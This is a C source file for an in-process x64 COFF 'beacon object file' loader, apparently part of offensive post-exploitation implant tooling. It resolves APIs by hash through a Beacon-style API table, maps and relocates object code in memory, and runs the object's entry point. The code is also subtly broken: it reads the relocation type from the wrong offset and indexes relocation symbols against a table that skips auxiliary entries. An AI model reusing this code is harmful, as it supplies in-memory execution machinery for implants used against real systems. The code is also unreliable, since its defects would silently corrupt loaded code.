/*
 * bof.c — in-process COFF/BOF loader.
 *
 * Parses an x64 COFF object, allocates sections, resolves symbols, applies
 * AMD64 relocations, registers unwind metadata, and invokes the entry point.
 */

#include "bofloader.h"

/* -------------------------------------------------------------------------- */
/* Helpers                                                                      */
/* -------------------------------------------------------------------------- */

static SIZE_T RoundUp(SIZE_T v, SIZE_T align) {
    return (v + align - 1) & ~(align - 1);
}

static int SectionNameEqual(PCOF_SECTION sec, const char* name) {
    int i = 0;
    while (i < 8) {
        char c = sec->Name[i];
        if (c == 0) break;
        if (c != name[i]) return 0;
        i++;
    }
    return name[i] == 0;
}

/* Read a symbol name: either inline (<=8 chars) or from string table. */
static void ReadSymbolName(const BYTE* raw, const BYTE* strtab, DWORD strtab_size,
                           int sym_off, char* out, int out_len) {
    const BYTE* name = raw + sym_off;
    BOOL strtab_ref = (name[0] | name[1] | name[2] | name[3]) == 0;
    if (strtab_ref) {
        DWORD off = *(DWORD*)(name + 4);
        if (off >= strtab_size) { out[0] = 0; return; }
        DWORD end = off;
        while (end < strtab_size && strtab[end]) end++;
        DWORD len = end - off;
        if (len >= (DWORD)out_len - 1) len = out_len - 1;
        MemCpy(out, strtab + off, len);
        out[len] = 0;
    } else {
        int len = 0;
        while (len < 8 && name[len]) len++;
        if (len >= out_len - 1) len = out_len - 1;
        MemCpy(out, name, len);
        out[len] = 0;
    }
}

/* Strip __imp_ and leading _ from a symbol name. */
static void CanonName(const char* in, char* out, int out_len) {
    const char* p = in;
    if (StrCmpNI(p, "__imp_", 6) == 0) p += 6;
    else if (p[0] == '_') p++;
    int i = 0;
    while (p[i] && i < out_len - 1) { out[i] = p[i]; i++; }
    out[i] = 0;
}

static DWORD SectionFinalProtection(DWORD ch) {
    int exe = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
    int wr  = (ch & IMAGE_SCN_MEM_WRITE)  != 0;
    int rd  = (ch & IMAGE_SCN_MEM_READ)   != 0;
    /* never use RWX: prefer RX for executable sections, RW for writable data */
    (void)wr;
    if (exe) return PAGE_EXECUTE_READ;
    if (rd) return PAGE_READWRITE;
    return PAGE_READWRITE;
}

/* -------------------------------------------------------------------------- */
/* Symbol resolution                                                            */
/* -------------------------------------------------------------------------- */

static PVOID* EnsureIat(BOF_INSTANCE* bi) {
    if (bi->iat_count < bi->iat_cap) return NULL;
    int newcap = bi->iat_cap ? bi->iat_cap * 2 : 16;
    PVOID* ns = (PVOID*)bi->Heap->HeapAlloc(bi->Heap->GetProcessHeap(), 0, newcap * sizeof(PVOID));
    char** nn = (char**)bi->Heap->HeapAlloc(bi->Heap->GetProcessHeap(), 0, newcap * sizeof(char*));
    if (!ns || !nn) return NULL;
    if (bi->iat_slots) {
        MemCpy(ns, bi->iat_slots, bi->iat_cap * sizeof(PVOID));
        MemCpy(nn, bi->iat_names, bi->iat_cap * sizeof(char*));
        bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->iat_slots);
        bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->iat_names);
    }
    bi->iat_slots = ns;
    bi->iat_names = nn;
    bi->iat_cap = newcap;
    return &bi->iat_slots[bi->iat_count];
}

static PVOID IatSlotFor(BOF_INSTANCE* bi, PVOID fn, const char* name) {
    if (!fn) return NULL;
    /* search existing */
    for (int i = 0; i < bi->iat_count; i++) {
        if (bi->iat_names[i] && StrCmpNI(bi->iat_names[i], name, 128) == 0)
            return bi->iat_slots[i];
    }
    /* allocate new 8-byte slot */
    SIZE_T sz = 8;
    PVOID slot = NULL;
    if (!NT_SUCCESS(bi->Nt->NtAllocateVirtualMemory(NtCurrentProcess(), &slot, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) || !slot)
        return fn; /* last resort: return raw fn, will likely overflow REL32 but better than null */
    *(PVOID*)slot = fn;
    /* grow table */
    if (bi->iat_count >= bi->iat_cap) {
        if (!EnsureIat(bi)) {
            SIZE_T free_sz = 0;
            bi->Nt->NtFreeVirtualMemory(NtCurrentProcess(), &slot, &free_sz, MEM_RELEASE);
            return fn;
        }
    }
    int nlen = StrLenA(name) + 1;
    bi->iat_names[bi->iat_count] = (char*)bi->Heap->HeapAlloc(bi->Heap->GetProcessHeap(), 0, nlen);
    if (bi->iat_names[bi->iat_count]) {
        MemCpy(bi->iat_names[bi->iat_count], name, nlen);
    }
    bi->iat_slots[bi->iat_count] = slot;
    bi->iat_count++;
    return slot;
}

static PVOID ResolveExternal(BOF_INSTANCE* bi, const char* name) {
    char canon[128];
    CanonName(name, canon, sizeof(canon));

    /* 1. Beacon API table */
    PVOID p = BofApiByName(canon);
    if (p) return p;

    /* 2. MODULE$FUNCTION */
    int dollar = -1;
    for (int i = 0; canon[i]; i++) {
        if (canon[i] == '$') { dollar = i; break; }
    }
    if (dollar > 0) {
        char dll[64];
        int j = 0;
        while (j < dollar && j < 63) { dll[j] = canon[j]; j++; }
        dll[j] = 0;
        /* lowercase and append .dll */
        for (int k = 0; dll[k]; k++) {
            if (dll[k] >= 'A' && dll[k] <= 'Z') dll[k] += 0x20;
        }
        char dllname[72];
        int a = 0; while (dll[a]) { dllname[a] = dll[a]; a++; }
        dllname[a++] = '.'; dllname[a++] = 'd'; dllname[a++] = 'l'; dllname[a++] = 'l'; dllname[a] = 0;
        WCHAR wdll[72];
        for (int k = 0; dllname[k]; k++) wdll[k] = (WCHAR)(BYTE)dllname[k];
        wdll[a] = 0;
        PVOID h = LdrModule(HashStringW(wdll, a));
        if (!h) h = LoadDll(wdll);
        if (h) {
            const char* func = canon + dollar + 1;
            PVOID fn = LdrFunction(h, HashStringA(func, 0));
            /* use GetProcAddress for forwarded exports */
            if (!fn) {
                PVOID k32 = LdrModule(H_KERNEL32_DLL);
                if (k32) {
                    typedef PVOID (WINAPI *pGPA)(PVOID, LPCSTR);
                    typedef PVOID (WINAPI *pGMH)(LPCSTR);
                    pGPA gpa = (pGPA)LdrFunction(k32, H_GETPROCADDRESS);
                    pGMH gmh = (pGMH)LdrFunction(k32, H_GETMODULEHANDLEA);
                    if (gpa && gmh) {
                        PVOID hm = (PVOID)gmh(dllname);
                        if (!hm) hm = (PVOID)LoadDll(wdll);
                        if (hm) fn = gpa(hm, func);
                    }
                }
            }
            if (fn) return IatSlotFor(bi, fn, canon);
        }
    }

    /* 3. Bare symbol fallback to kernel32 GetProcAddress */
    {
        PVOID k32 = LdrModule(H_KERNEL32_DLL);
        if (k32) {
            typedef PVOID (WINAPI *pGPA)(PVOID, LPCSTR);
            pGPA gpa = (pGPA)LdrFunction(k32, H_GETPROCADDRESS);
            if (gpa) {
                PVOID fn = gpa((PVOID)k32, canon);
                if (fn) return IatSlotFor(bi, fn, canon);
            }
        }
    }
    return NULL;
}

/* -------------------------------------------------------------------------- */
/* COFF loading                                                                 */
/* -------------------------------------------------------------------------- */

static int BofParseAndLoad(BOF_INSTANCE* bi, const BYTE* raw, DWORD raw_size) {
    if (raw_size < 20) return 0;
    PCOF_HEADER hdr = (PCOF_HEADER)raw;
    if (hdr->Machine != COF_MACHINE_AMD64) return 0;
    if (hdr->SizeOfOptionalHeader != 0) return 0;

    int sec_count = hdr->NumberOfSections;
    if (sec_count <= 0 || sec_count > 64) return 0;

    DWORD sym_off = hdr->PointerToSymbolTable;
    DWORD sym_count = hdr->NumberOfSymbols;
    DWORD strtab_off = sym_off + sym_count * 18;
    DWORD strtab_size = 0;
    if (strtab_off > raw_size) return 0;
    if (strtab_off + 4 <= raw_size) strtab_size = *(DWORD*)(raw + strtab_off);
    if (strtab_off + strtab_size > raw_size || strtab_size < 4) strtab_size = 4;
    const BYTE* strtab = raw + strtab_off;

    bi->section_count = sec_count;
    SIZE_T sec_array_sz = sec_count * sizeof(COF_SECTION);
    bi->sections = (PCOF_SECTION)bi->Heap->HeapAlloc(bi->Heap->GetProcessHeap(), 0, sec_array_sz);
    bi->section_bases = (PVOID*)bi->Heap->HeapAlloc(bi->Heap->GetProcessHeap(), 0, sec_count * sizeof(PVOID));
    bi->section_allocsizes = (int*)bi->Heap->HeapAlloc(bi->Heap->GetProcessHeap(), 0, sec_count * sizeof(int));
    if (!bi->sections || !bi->section_bases || !bi->section_allocsizes) return 0;

    /* parse sections */
    for (int s = 0; s < sec_count; s++) {
        PCOF_SECTION sh = (PCOF_SECTION)(raw + 20 + s * 40);
        MemCpy(&bi->sections[s], sh, sizeof(COF_SECTION));
    }

    /* allocate sections */
    ULONGLONG min_addr = (ULONGLONG)-1;
    for (int s = 0; s < sec_count; s++) {
        PCOF_SECTION sec = &bi->sections[s];
        int size = (int)sec->VirtualSize;
        if ((int)sec->SizeOfRawData > size) size = (int)sec->SizeOfRawData;
        if (size <= 0) {
            bi->section_bases[s] = NULL;
            bi->section_allocsizes[s] = 0;
            continue;
        }
        int alloc = (int)RoundUp(size, 0x1000);
        PVOID base = NULL;
        SIZE_T sz = alloc;
        NTSTATUS st = bi->Nt->NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st) || !base) return 0;
        bi->section_bases[s] = base;
        bi->section_allocsizes[s] = alloc;
        MemSet(base, 0, alloc);
        if (sec->SizeOfRawData > 0) {
            DWORD end = sec->PointerToRawData + sec->SizeOfRawData;
            if (end > raw_size) return 0;
            MemCpy(base, raw + sec->PointerToRawData, sec->SizeOfRawData);
        }
        if ((ULONGLONG)base < min_addr) min_addr = (ULONGLONG)base;
    }
    bi->image_base = min_addr;

    /* parse symbols */
    int total_syms = 0;
    for (DWORD i = 0; i < sym_count; ) {
        total_syms++;
        int off = sym_off + i * 18;
        if ((DWORD)(off + 18) > raw_size) return 0;
        BYTE aux = raw[off + 17];
        i += 1 + aux;
        if (i > sym_count) return 0;
    }
    bi->sym_addrs = (PVOID*)bi->Heap->HeapAlloc(bi->Heap->GetProcessHeap(), 0, total_syms * sizeof(PVOID));
    if (!bi->sym_addrs) return 0;
    MemSet(bi->sym_addrs, 0, total_syms * sizeof(PVOID));

    /* resolve symbols */
    int idx = 0;
    for (DWORD i = 0; i < sym_count; ) {
        int off = sym_off + i * 18;
        PCOF_SYMBOL sym = (PCOF_SYMBOL)(raw + off);
        char name[256];
        ReadSymbolName(raw, strtab, strtab_size, off, name, sizeof(name));
        SHORT secnum = sym->SectionNumber;
        BYTE storage = sym->StorageClass;

        if (secnum == 0 && storage == IMAGE_SYM_CLASS_EXTERNAL) {
            /* external import */
            bi->sym_addrs[idx] = ResolveExternal(bi, name);
        } else if (secnum == -1) {
            bi->sym_addrs[idx] = (PVOID)(ULONG_PTR)sym->Value;
        } else if (secnum > 0 && secnum <= sec_count) {
            if (bi->section_bases[secnum - 1])
                bi->sym_addrs[idx] = (PVOID)((BYTE*)bi->section_bases[secnum - 1] + sym->Value);
        }

        idx++;
        i += 1 + sym->NumberOfAuxSymbols;
    }

    /* apply relocations */
    for (int s = 0; s < sec_count; s++) {
        PCOF_SECTION sec = &bi->sections[s];
        if (sec->NumberOfRelocations == 0 || !bi->section_bases[s]) continue;
        DWORD base_reloc = sec->PointerToRelocations;
        for (int r = 0; r < sec->NumberOfRelocations; r++) {
            int ro = base_reloc + r * 10;
            if (ro + 10 > (int)raw_size) return 0;
            DWORD va = *(DWORD*)(raw + ro);
            DWORD sym_idx = *(DWORD*)(raw + ro + 4);
            WORD rtype = *(WORD*)(raw + ro + 6);
            PVOID site = (PVOID)((BYTE*)bi->section_bases[s] + va);
            PVOID target = (sym_idx < (DWORD)total_syms) ? bi->sym_addrs[sym_idx] : NULL;

            switch (rtype) {
                case IMAGE_REL_AMD64_ABSOLUTE:
                    break;
                case IMAGE_REL_AMD64_ADDR64: {
                    long long* p = (long long*)site;
                    *p = *p + (long long)(LONG_PTR)target;
                    break;
                }
                case IMAGE_REL_AMD64_ADDR32NB: {
                    int* p = (int*)site;
                    *p = (int)((LONG_PTR)target - (LONG_PTR)bi->image_base);
                    break;
                }
                case IMAGE_REL_AMD64_ADDR32: {
                    int* p = (int*)site;
                    *p = (int)(LONG_PTR)target;
                    break;
                }
                case IMAGE_REL_AMD64_REL32:
                case IMAGE_REL_AMD64_REL32_1:
                case IMAGE_REL_AMD64_REL32_2:
                case IMAGE_REL_AMD64_REL32_3:
                case IMAGE_REL_AMD64_REL32_4:
                case IMAGE_REL_AMD64_REL32_5: {
                    int n = rtype - IMAGE_REL_AMD64_REL32;
                    int* p = (int*)((BYTE*)site + n);
                    long long disp = (LONG_PTR)target - ((LONG_PTR)site + 4 + n);
                    *p = *p + (int)disp;
                    break;
                }
                default:
                    /* unhandled relocation */
                    break;
            }
        }
    }

    /* protect sections */
    for (int s = 0; s < sec_count; s++) {
        PCOF_SECTION sec = &bi->sections[s];
        if (!bi->section_bases[s]) continue;
        DWORD prot = SectionFinalProtection(sec->Characteristics);
        if (prot == PAGE_READWRITE) continue;
        SIZE_T sz = bi->section_allocsizes[s];
        PVOID base = bi->section_bases[s];
        DWORD old = 0;
        bi->Nt->NtProtectVirtualMemory(NtCurrentProcess(), &base, &sz, prot, &old);
    }

    /* register .pdata if present */
    for (int s = 0; s < sec_count; s++) {
        if (SectionNameEqual(&bi->sections[s], ".pdata")) {
            DWORD sz = bi->sections[s].VirtualSize;
            if (bi->sections[s].SizeOfRawData > sz) sz = bi->sections[s].SizeOfRawData;
            if (sz >= sizeof(RUNTIME_FUNCTION) && bi->Nt->RtlAddFunctionTable) {
                bi->registered_rf = (PRUNTIME_FUNCTION)bi->section_bases[s];
                bi->registered_count = sz / sizeof(RUNTIME_FUNCTION);
                bi->Nt->RtlAddFunctionTable(bi->registered_rf, bi->registered_count, bi->image_base);
            }
            break;
        }
    }

    return 1;
}

/* -------------------------------------------------------------------------- */
/* Entry point and execution                                                    */
/* -------------------------------------------------------------------------- */

int BofRun(BOF_INSTANCE* bi, const BYTE* bof, DWORD bof_size,
           const char* entry_name, const BYTE* args, DWORD args_len,
           char** output, int* output_len) {
    *output = NULL;
    *output_len = 0;

    if (!bi || !bof || !bof_size) return 0;

    BofInitApis(bi);
    MemSet(g_kv, 0, sizeof(g_kv));

    if (!BofParseAndLoad(bi, bof, bof_size)) {
        OutAppend("[!] BOF load failed\n", 19);
        if (bi->outbuf) { *output = bi->outbuf; *output_len = bi->outlen; }
        return 0;
    }

    /* find entry point by scanning symbol table again */
    PCOF_HEADER hdr = (PCOF_HEADER)bof;
    DWORD sym_off = hdr->PointerToSymbolTable;
    DWORD sym_count = hdr->NumberOfSymbols;
    DWORD strtab_off = sym_off + sym_count * 18;
    DWORD strtab_size = 0;
    if (strtab_off + 4 <= bof_size) strtab_size = *(DWORD*)(bof + strtab_off);
    const BYTE* strtab = bof + strtab_off;
    BOF_ENTRY go = NULL;
    int sym_idx = 0;
    for (DWORD i = 0; i < sym_count; ) {
        int off = sym_off + i * 18;
        PCOF_SYMBOL sym = (PCOF_SYMBOL)(bof + off);
        char name[256];
        ReadSymbolName(bof, strtab, strtab_size, off, name, sizeof(name));
        if (StrCmpA(name, entry_name) == 0 && sym->SectionNumber > 0 && sym->SectionNumber <= bi->section_count) {
            go = (BOF_ENTRY)((BYTE*)bi->section_bases[sym->SectionNumber - 1] + sym->Value);
            break;
        }
        sym_idx++;
        i += 1 + sym->NumberOfAuxSymbols;
    }

    if (!go) {
        OutAppend("[!] BOF entry '", 15);
        OutAppend(entry_name, StrLenA(entry_name));
        OutAppend("' not found\n", 12);
        if (bi->outbuf) { *output = bi->outbuf; *output_len = bi->outlen; }
        return 0;
    }

    /* call go */
    go((char*)args, (int)args_len);

    if (bi->outbuf) { *output = bi->outbuf; *output_len = bi->outlen; }
    return 1;
}

/* -------------------------------------------------------------------------- */
/* Cleanup                                                                      */
/* -------------------------------------------------------------------------- */

void BofFree(BOF_INSTANCE* bi) {
    if (!bi) return;
    if (bi->registered_rf && bi->Nt->RtlDeleteFunctionTable)
        bi->Nt->RtlDeleteFunctionTable(bi->registered_rf);
    bi->registered_rf = NULL;

    for (int i = 0; i < bi->iat_count; i++) {
        if (bi->iat_slots[i]) {
            SIZE_T sz = 0;
            bi->Nt->NtFreeVirtualMemory(NtCurrentProcess(), &bi->iat_slots[i], &sz, MEM_RELEASE);
        }
        if (bi->iat_names[i]) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->iat_names[i]);
    }
    if (bi->iat_slots) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->iat_slots);
    if (bi->iat_names) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->iat_names);

    for (int s = 0; s < bi->section_count; s++) {
        if (bi->section_bases[s]) {
            SIZE_T sz = 0;
            bi->Nt->NtFreeVirtualMemory(NtCurrentProcess(), &bi->section_bases[s], &sz, MEM_RELEASE);
        }
    }
    if (bi->sections) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->sections);
    if (bi->section_bases) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->section_bases);
    if (bi->section_allocsizes) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->section_allocsizes);
    if (bi->sym_addrs) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->sym_addrs);
    if (bi->outbuf) bi->Heap->HeapFree(bi->Heap->GetProcessHeap(), 0, bi->outbuf);
    MemSet(bi, 0, sizeof(*bi));
}
